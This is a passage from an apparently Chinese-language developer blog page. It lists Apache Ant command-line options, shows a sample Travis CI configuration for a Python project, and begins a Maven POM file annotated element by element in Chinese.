class="line">  -debug, -d             print debugging information</span><br><span class="line">  -emacs, -e             produce logging information without adornments</span><br><span class="line">  -lib &lt;path&gt;            specifies a path to search for jars and classes</span><br><span class="line">  -logfile &lt;file&gt;        use given file for log</span><br><span class="line">    -l     &lt;file&gt;                &#x27;&#x27;</span><br><span class="line">  -logger &lt;classname&gt;    the class which is to perform logging</span><br><span class="line">  -listener &lt;classname&gt;  add an instance of class as a project listener</span><br><span class="line">  -noinput               do not allow interactive input</span><br><span class="line">  -buildfile &lt;file&gt;      use given buildfile</span><br><span class="line">    -file    &lt;file&gt;              &#x27;&#x27;</span><br><span class="line">    -f       &lt;file&gt;              &#x27;&#x27;</span><br><span class="line">  -D&lt;property&gt;=&lt;value&gt;   use value for given property</span><br><span class="line">  -keep-going, -k        execute all targets that do not depend</span><br><span class="line">                         on failed target(s)</span><br><span class="line">  -propertyfile &lt;name&gt;   load all properties from file with -D</span><br><span class="line">                         properties taking precedence</span><br><span class="line">  -inputhandler &lt;class&gt;  the class which will handle input requests</span><br><span class="line">  -find &lt;file&gt;           (s)earch for buildfile towards the root of</span><br><span class="line">    -s  &lt;file&gt;           the filesystem and use it</span><br><span class="line">  -nice  number          A niceness value for the main thread:</span><br><span class="line">                         1 (lowest) to 10 (highest); 5 is the default</span><br><span class="line">  -nouserlib             Run ant without using the jar files from $&#123;user.home&#125;/.ant/lib</span><br><span class="line">  -noclasspath           Run ant without using CLASSPATH</span><br><span class="line">  -autoproxy             Java 5+ : use the OS proxies</span><br><span class="line">  -main &lt;class&gt;          override Ant&#x27;s normal entry point</span><br></pre></td></tr></table></figure><h1 id="Travis-CI"><a href="#Travis-CI" class="headerlink" title="Travis-CI"></a>Travis-CI</h1><p><a href="http://www.ruanyifeng.com/blog/2017/12/travis_ci_tutorial.html">持续集成服务 Travis CI 教程</a></p><p><a href="https://docs.travis-ci.com/user/tutorial/">Travis CI Tutorial</a></p><p>项目根目录添加<code>.travis.yml</code>文件</p><p>python项目示例：</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">language:</span> <span class="string">python</span></span><br><span class="line"><span class="attr">sudo:</span> <span class="string">required</span></span><br><span class="line"><span class="attr">before_install:</span> <span class="string">sudo</span> <span class="string">pip</span> <span class="string">install</span> <span class="string">foo</span></span><br><span class="line"><span class="attr">script:</span> <span class="string">bundle</span> <span class="string">exec</span> <span class="string">thor</span> <span class="string">build</span>  <span class="comment"># 指定构建或测试脚本</span></span><br><span class="line"><span class="attr">install:</span> <span class="string">./install-dependencies.sh</span>  <span class="comment"># 安装指定脚本</span></span><br></pre></td></tr></table></figure><h1 id="POM-标签大全详解"><a href="#POM-标签大全详解" class="headerlink" title="POM 标签大全详解"></a>POM 标签大全详解</h1><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">project</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0&quot;</span> <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">    <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;http://maven.apache.org/POM/4.0.0http://maven.apache.org/maven-v4_0_0.xsd&quot;</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--父项目的坐标。如果项目中没有规定某个元素的值，那么父项目中的对应值即为项目的默认值。 坐标包括group ID，artifact ID和 </span></span><br><span class="line"><span class="comment">        version。 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">parent</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--被继承的父项目的构件标识符 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span> /&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--被继承的父项目的全球唯一标识符 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span> /&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--被继承的父项目的版本 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span> /&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 父项目的pom.xml文件的相对路径。相对路径允许你选择一个不同的路径。默认值是../pom.xml。Maven首先在构建当前项目的地方寻找父项 </span></span><br><span class="line"><span class="comment">            目的pom，其次在文件系统的这个位置（relativePath位置），然后在本地仓库，最后在远程仓库寻找父项目的pom。 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">relativePath</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">parent</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--声明项目描述符遵循哪一个POM模型版本。模型本身的版本很少改变，虽然如此，但它仍然是必不可少的，这是为了当Maven引入了新的特性或者其他模型变更的时候，确保稳定性。 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">modelVersion</span>&gt;</span>4.0.0<span class="tag">&lt;/<span class="name">modelVersion</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--项目的全球唯一标识符，通常使用全限定的包名区分该项目和其他项目。并且构建时生成的路径也是由此生成， 如com.mycompany.app生成的相对路径为：/com/mycompany/app --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>asia.banseon<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 构件的标识符，它和group ID一起唯一标识一个构件。换句话说，你不能有两个不同的项目拥有同样的artifact ID和groupID；在某个 </span></span><br><span class="line"><span class="comment">        特定的group ID下，artifact ID也必须是唯一的。构件是项目产生的或使用的一个东西，Maven为项目产生的构件包括：JARs，源 码，二进制发布和WARs等。 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>banseon-maven2<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--项目产生的构件类型，例如jar、war、ear、pom。插件可以创建他们自己的构件类型，所以前面列的不是全部构件类型 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">packaging</span>&gt;</span>jar<span class="tag">&lt;/<span class="name">packaging</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--项目当前版本，格式为:主版本.次版本.增量版本-限定版本号 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.0-SNAPSHOT<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--项目的名称, Maven产生的文档用 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">name</span>&gt;</span>banseon-maven<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--项目主页的URL, Maven产生的文档用 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://www.baidu.com/banseon<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 项目的详细描述, Maven 产生的文档用。 当这个元素能够用HTML格式描述时（例如，CDATA中的文本会被解析器忽略，就可以包含HTML标 </span></span><br><span class="line"><span class="comment">        签）， 不鼓励使用纯文本描述。如果你需要修改产生的web站点的索引页面，你应该修改你自己的索引页文件，而不是调整这里的文档。 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span>A maven project to study maven.<span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--描述了这个项目构建环境中的前提条件。 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">prerequisites</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--构建该项目或使用该插件所需要的Maven的最低版本 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">maven</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">prerequisites</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--项目的问题管理系统(Bugzilla, Jira, Scarab,或任何你喜欢的问题管理系统)的名称和URL，本例为 jira --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">issueManagement</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--问题管理系统（例如jira）的名字， --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">system</span>&gt;</span>jira<span class="tag">&lt;/<span class="name">system</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--该项目使用的问题管理系统的URL --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url</span>&gt;</span>http://jira.baidu.com/banseon<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">issueManagement</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--项目持续集成信息 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">ciManagement</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--持续集成系统的名字，例如continuum --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">system</span> /&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--该项目使用的持续集成系统的URL（如果持续集成系统有web接口的话）。 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url</span> /&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--构建完成时，需要通知的开发者/用户的配置项。包括被通知者信息和通知条件（错误，失败，成功，警告） --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">notifiers</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--配置一种方式，当构建中断时，以该方式通知用户/开发者 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">notifier</span>&gt;</span></span><br><span class="line">                <span class="comment">&lt;!--传送通知的途径 --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">type</span> /&gt;</span></span><br><span class="line">                <span class="comment">&lt;!--发生错误时是否通知 --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">sendOnError</span> /&gt;</span></span><br><span class="line">                <span class="comment">&lt;!--构建失败时是否通知 --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">sendOnFailure</span> /&gt;</span></span><br><span class="line">                <span class="comment">&lt;!--构建成功时是否通知 --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">sendOnSuccess</span> /&gt;</span></span><br><span class="line">                <span class="comment">&lt;!--发生警告时是否通知 --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">sendOnWarning</span> /&gt;</span></span><br><span class="line">                <span class="comment">&lt;!--不赞成使用。通知发送到哪里 --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">address</span> /&gt;</span></span><br><span class="line">                <span class="comment">&lt;!--扩展配置项 --&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">configuration</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">notifier</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">notifiers</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ciManagement</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--项目创建年份，4位数字。当产生版权信息时需要使用这个值。 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">inceptionYear</span> /&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--项目相关邮件列表信息 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">mailingLists</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--该元素描述了项目相关的所有邮件列表。自动产生的网站引用这些信息。 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">mailingList</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--邮件的名称 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">name</span>&gt;</span>Demo<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--发送邮件的地址或链接，如果是邮件地址，创建文档时，mailto: 链接会被自动创建 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">post</span>&gt;</span>banseon@126.com<span class="tag">&lt;/<span class="name">post</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--订阅邮件的地址或链接，如果是邮件地址，创建文档时，mailto: 链接会被自动创建 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">subscribe</span>&gt;</span>banseon@126.com<span class="tag">&lt;/<span class="name">subscribe</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--取消订阅邮件的地址或链接，如果是邮件地址，创建文档时，mailto: 链接会被自动创建 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">unsubscribe</span>&gt;</span>banseon@126.com<span class="tag">&lt;/<span class="name">unsubscribe</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--你可以浏览邮件信息的URL --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">archive</span>&gt;</span>http:/hi.baidu.com/banseon/demo/dev/<span class="tag">&lt;/<span class="name">archive</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">mailingList</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">mailingLists</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!--项目开发者列表 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">developers</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--某个项目开发者的信息 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">developer</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--SCM里项目开发者的唯一标识符 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">id</span>&gt;</span>HELLO WORLD<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--项目开发者的全名 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">name</span>&gt;</span>banseon<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--项目开发者的email --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">email</span>&gt;</span>banseon@126.com<span class="tag">&lt;/<span class="name">email</span>&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--项目开发者的主页的URL --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">url</span> /&gt;</span></span><br><span class="line">            <span class="comment">&lt;!--项目开发者在项目中扮演的角色，角色元素描述了各种角色 --&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">roles</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">role</span>&gt;</span>Project Manager<span class="tag">&lt;/<span class="name">role</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">role</span>&gt;</span>Architect<span class="tag">&lt;/<span class="name">role</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span 